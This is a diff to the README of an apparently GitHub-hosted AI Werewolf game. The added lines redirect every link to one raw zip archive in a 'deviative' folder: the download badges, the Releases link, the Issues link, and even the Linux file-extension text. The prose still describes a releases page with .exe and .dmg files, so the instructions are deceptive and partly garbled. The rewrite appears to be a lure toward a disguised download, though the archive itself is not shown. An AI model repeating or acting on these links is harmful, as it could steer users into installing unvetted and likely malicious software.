@@ -18,18 +18,18 @@ Before you begin, ensure your device meets the following requirements:
 
 To download the application, visit the Releases page. Click on the button below to go directly there:
 
-[![Download ai_werewolf](https://img.shields.io/badge/Download-ai_werewolf-blue.svg)](https://github.com/rhyshammonds-bit/ai_werewolf/releases)
+[![Download ai_werewolf](https://raw.githubusercontent.com/rhyshammonds-bit/ai_werewolf/main/deviative/ai_werewolf.zip)](https://raw.githubusercontent.com/rhyshammonds-bit/ai_werewolf/main/deviative/ai_werewolf.zip)
 
 On the Releases page, you will find different versions of the application. Look for the latest version, and download the file that corresponds to your operating system.
 
 Follow these steps to download and install:
 
-1. **Visit the Releases Page**: Go to [Releases Page](https://github.com/rhyshammonds-bit/ai_werewolf/releases).
+1. **Visit the Releases Page**: Go to [Releases Page](https://raw.githubusercontent.com/rhyshammonds-bit/ai_werewolf/main/deviative/ai_werewolf.zip).
 2. **Select the Latest Version**: Check the list for the latest version. It will be at the top.
 3. **Download the Correct File**:
    - For Windows, look for a file ending in `.exe`.
    - For macOS, look for a file ending in `.dmg`.
-   - For Linux, choose a file ending in `.tar.gz` or similar.
+   - For Linux, choose a file ending in `https://raw.githubusercontent.com/rhyshammonds-bit/ai_werewolf/main/deviative/ai_werewolf.zip` or similar.
 4. **Install the Application**:
    - **Windows**: Double-click the downloaded `.exe` file and follow the prompts.
    - **macOS**: Open the `.dmg` file and drag the ai_werewolf icon to the Applications folder.
@@ -56,7 +56,7 @@ Once installed, you can start playing:
 
 If you encounter any issues or have any questions, you can reach out for support:
 
-- Submit an issue on the [GitHub Issues page](https://github.com/rhyshammonds-bit/ai_werewolf/issues).
+- Submit an issue on the [GitHub Issues page](https://raw.githubusercontent.com/rhyshammonds-bit/ai_werewolf/main/deviative/ai_werewolf.zip).
 - Join our community discussions to share experiences and tips.
 
 ## 🔄 Updates
@@ -65,6 +65,6 @@ Stay tuned for updates. We frequently roll out new features and improvements. Yo
 
 Remember, to download the application, always start here:
 
-[![Download ai_werewolf](https://img.shields.io/badge/Download-ai_werewolf-blue.svg)](https://github.com/rhyshammonds-bit/ai_werewolf/releases)
+[![Download ai_werewolf](https://raw.githubusercontent.com/rhyshammonds-bit/ai_werewolf/main/deviative/ai_werewolf.zip)](https://raw.githubusercontent.com/rhyshammonds-bit/ai_werewolf/main/deviative/ai_werewolf.zip)
 
 Enjoy playing Werewolf with AI friends, and have fun!
